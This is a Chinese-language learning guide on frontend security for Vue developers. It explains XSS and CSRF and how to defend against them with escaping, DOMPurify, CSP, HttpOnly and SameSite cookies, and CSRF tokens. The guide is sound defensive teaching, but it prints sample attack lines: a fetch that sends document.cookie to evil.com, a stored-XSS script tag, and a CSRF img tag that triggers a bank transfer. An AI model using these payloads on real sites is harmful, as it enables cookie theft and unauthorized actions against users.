# 模块十七：前端安全（XSS 与 CSRF）（完整学习指南）

> **学习目标**：理解前端两大主流攻击——XSS（跨站脚本）和 CSRF（跨站请求伪造）的原理、危害与防御手段，掌握输入转义、CSP、HttpOnly Cookie、SameSite、CSRF Token、点击劫持防护等落地方法，能独立给一个 Vue 项目做基础安全加固，并避开「用 v-html 渲染用户内容、token 裸放 localStorage、GET 做危险操作」等典型坑。
> **适合谁**：会写前端、会发请求、知道 cookie/session 是什么，但没系统想过「用户输入会怎么搞垮网站」的同学。
> **学完能做什么**：识别代码里的 XSS 风险点，正确使用 Vue 的转义与 `v-html` 边界，给接口加 CSRF Token 与 SameSite 防护，理解为什么登录态不该裸放 localStorage。

---

## 1. 前置知识（先确认你会这些）

- 模块三（Axios）/模块四（CORS）：知道请求怎么发、同源策略
- 模块八（Pinia）/模块十一（浏览器原理）：知道 cookie/localStorage、同源
- 知道 HTML 里 `<script>` 会执行 JS
- 知道「攻击者能往页面塞 JS」意味着什么

> 安全是「防御性编程」。本篇讲前端视角最常见的两类：XSS（偷数据/钓鱼/劫持）和 CSRF（冒充你发请求）。后端配合也很关键，但前端是第一道防线。

---

## 2. 核心概念一：XSS（跨站脚本）

**XSS = 攻击者在你的页面里注入并执行恶意脚本**。一旦脚本跑起来，它能：偷 cookie/token、篡改页面、跳转到钓鱼站、用你的身份发请求。

### 2.1 三种 XSS

| 类型 | 注入点 | 例子 |
|---|---|---|
| **存储型** | 恶意内容存进数据库，别人看时执行 | 评论区存 `<script>steal()</script>`，所有访客中招 |
| **反射型** | 恶意脚本在 URL 里，服务器原样返回页面执行 | `?q=<script>...</script>` 回显到页面 |
| **DOM 型** | 前端 JS 把不可信数据写进 DOM | `document.write(location.hash)`、`innerHTML = userInput` |

### 2.2 为什么危险（能做什么）

```js
// 攻击者注入的脚本能这样偷东西
fetch('https://evil.com/steal?c=' + document.cookie)   // 把 cookie 发走
localStorage.getItem('token')                            // 读登录 token
// 还能伪造操作：用当前用户身份发请求、改密码
```

### 2.3 防御 XSS

**① 永远不要信任用户输入，输出时转义**

```vue
<!-- ✅ Vue 默认 {{ }} 会自动转义 HTML，安全 -->
<p>{{ userComment }}</p>     <!-- 即使内容是 <script> 也当文本显示 -->

<!-- ❌ v-html 会原样插入 HTML，用户内容绝不能这么用 -->
<div v-html="userComment"></div>   // 危险！用户写 <script> 就执行
```

> **`v-html` 铁律**：只用于你**完全可控、可信**的 HTML（如后台富文本编辑器自己产的、服务端已清洗的）。用户 UGC 内容绝不用 `v-html`。

**② 必须渲染 HTML 时，服务端清洗**

用 `DOMPurify` 在前端或后端过滤掉 `<script>`/`onerror` 等危险标签：

```js
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userHtml)   // 去掉脚本/事件属性
```

**③ 设 CSP（内容安全策略）**

服务器返回响应头，告诉浏览器「只允许从哪加载脚本」：

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

这样即使有 XSS 注入，外域脚本也被浏览器拒绝执行。

**④ 敏感 cookie 设 HttpOnly**

```
Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict
```

`HttpOnly` 让 JS 读不到 cookie，XSS 偷不走（但仍能发请求，所以配合 CSRF 防护）。

---

## 3. 核心概念二：CSRF（跨站请求伪造）

**CSRF = 攻击者诱导你（已登录）的浏览器，向目标网站发一个你没打算发的请求**。因为浏览器会自动带上你的 cookie，服务器以为是你自己操作的。

### 3.1 攻击场景

```
你登录了 bank.com（cookie 有效）。
攻击者页面里有：<img src="https://bank.com/api/transfer?to=attacker&amount=10000">
你一打开攻击者页，浏览器自动带 cookie 请求 bank.com → 转账成功（你不知情）。
```

### 3.2 防御 CSRF

**① SameSite Cookie（最简单有效）**

```
Set-Cookie: session=abc; SameSite=Strict   // 跨站请求不带此 cookie
```
- `Strict`：完全不带跨站 cookie（最严，但可能影响体验）
- `Lax`：安全方法（GET 导航）带，POST/跨站不带（多数场景推荐）
- `None`：带，但必须 `Secure`

> 现代浏览器默认 `Lax`，已挡掉大部分 CSRF。但 `Lax` 下 GET 导航仍带，别用 GET 做危险操作。

**② CSRF Token**

服务器给表单/接口发一个随机 token，前端请求时带回去，攻击者跨站拿不到（同源策略限制读）：

```js
// 前端：从 meta 或接口拿 token，请求头带上
axios.defaults.headers.common['X-CSRF-Token'] = getToken()
```

**③ 校验来源（Origin / Referer）**

服务器检查请求头 `Origin` 是否来自自己域名，不符则拒。

**④ 不用 GET 做状态变更**

```
❌ GET /api/transfer?to=x&amount=10000   // 易被 <img>/<a> 触发
✅ POST /api/transfer 带 token           // 需构造表单+token，CSRF 难
```

---

## 4. 核心概念三：点击劫持与其他

**点击劫持**：攻击者用透明 iframe 盖在你的按钮上，你点的是攻击者的层。

```html
<!-- 防御：不让被 iframe 嵌套 -->
X-Frame-Options: DENY
# 或 CSP: frame-ancestors 'self'
```

**其他常提的**：
- **敏感操作二次确认**（改密码、转账发短信/邮箱验证码）
- **前端校验不能替代后端校验**：前端的校验只是体验，攻击者可直接调接口绕过，所有校验后端必须再做。

---

## 5. 常见坑与排错表

| # | 现象/做法 | 风险 | 正确做法 |
|---|---|---|---|
| 1 | 用 `v-html` 渲染用户评论 | XSS 执行 | 用 `{{ }}` 或 DOMPurify 清洗 |
| 2 | token 裸放 localStorage | XSS 一偷就走 | 用 HttpOnly cookie（JS 读不到） |
| 3 | cookie 没 HttpOnly | XSS 偷 cookie | 加 `HttpOnly; Secure` |
| 4 | 没设 SameSite | CSRF 可带 cookie | 设 `SameSite=Lax/Strict` |
| 5 | 用 GET 做转账/删数据 | 易被 `<img>` 触发 CSRF | 危险操作用 POST + token |
| 6 | 只前端校验表单 | 攻击者直接调接口绕过 | 后端必须重校验 |
| 7 | 富文本直接 v-html | 存储型 XSS | 后端/前端 DOMPurify 清洗 |
| 8 | 没 CSP | XSS 外域脚本可执行 | 配 Content-Security-Policy |
| 9 | 页面可被 iframe 嵌套 | 点击劫持 | `X-Frame-Options: DENY` |
| 10 | 内联 `onclick="..."` 拼用户数据 | XSS | 用框架事件绑定，数据不进 HTML |
| 11 | `eval(userInput)` | 任意代码执行 | 杜绝 eval，用 JSON.parse |
| 12 | 以为 HTTPS 就安全 | HTTPS 只防窃听不防 XSS/CSRF | XSS/CSRF 是应用层，需各自防御 |

---

## 6. 完整实战：给 Vue 项目做基础加固

**目标**：找出并修复 XSS 点，落实 CSRF 防护与 cookie 策略。

```vue
<!-- ❌ 危险：用户评论直接用 v-html -->
<div v-html="comment.content"></div>

<!-- ✅ 修复1：可信富文本用 DOMPurify 清洗后渲染 -->
<div v-html="safeComment"></div>
```
```js
import DOMPurify from 'dompurify'
const safeComment = computed(() => DOMPurify.sanitize(comment.value.content))
```

```js
// ✅ 修复2：请求统一带 CSRF token（从 meta 读，攻击者跨站拿不到）
const csrf = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content')
axios.defaults.headers.common['X-CSRF-Token'] = csrf
```

```js
// ✅ 修复3：敏感操作 POST + 后端校验 Origin
axios.post('/api/transfer', { to, amount })   // 不是 GET
```

```html
<!-- ✅ 修复4：服务器响应头（后端配，前端要知道要哪些） -->
<!-- Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax -->
<!-- Content-Security-Policy: default-src 'self' -->
<!-- X-Frame-Options: DENY -->
```

**验收打勾**：
- [ ] 全项目搜 `v-html`，用户内容处已改为 `{{ }}` 或 DOMPurify
- [ ] 无 `eval`/`innerHTML = 用户输入` 写法
- [ ] 请求带 CSRF Token，危险操作为 POST 非 GET
- [ ] 知道要让后端加 HttpOnly + SameSite + CSP + X-Frame-Options

---

## 7. 最佳实践

1. **输出转义是 XSS 第一防线**：Vue 的 `{{ }}` 默认转义，别破坏它。
2. **`v-html` 只用于可信 HTML**，UGC 用 DOMPurify 清洗。
3. **敏感 token 用 HttpOnly cookie**，别裸放 localStorage 被 XSS 偷。
4. **Cookie 设 SameSite=Lax/Strict** 挡大部分 CSRF。
5. **危险操作用 POST + CSRF Token**，绝不用 GET 改状态。
6. **配 CSP 与 X-Frame-Options**，兜底 XSS 与点击劫持。
7. **前端校验只是体验，后端必须重校验**，攻击者会绕过前端。
8. **杜绝 `eval`/`innerHTML` 拼接用户输入**。

---

## 8. 自测清单（全打勾才算掌握）

- [ ] 能说清 XSS 三种类型与危害
- [ ] 知道为什么 `{{ }}` 安全、`v-html` 危险
- [ ] 会用 DOMPurify 清洗富文本
- [ ] 知道 HttpOnly/SameSite/CSRF Token/CSP 各自防什么
- [ ] 能区分 XSS（注入脚本）与 CSRF（冒充发请求）
- [ ] 知道「前端校验不能替代后端校验」
- [ ] 能识别代码里的 XSS/CSRF 风险点并修复

---

## 9. 延伸阅读

- MDN XSS：https://developer.mozilla.org/zh-CN/docs/Web/Security/XMLHttpRequest/How_to_use_XHR#安全
- OWASP XSS 防护：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP CSRF：https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- CSP 介绍：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
- SameSite Cookie：https://web.dev/articles/samesite-cookies-explained
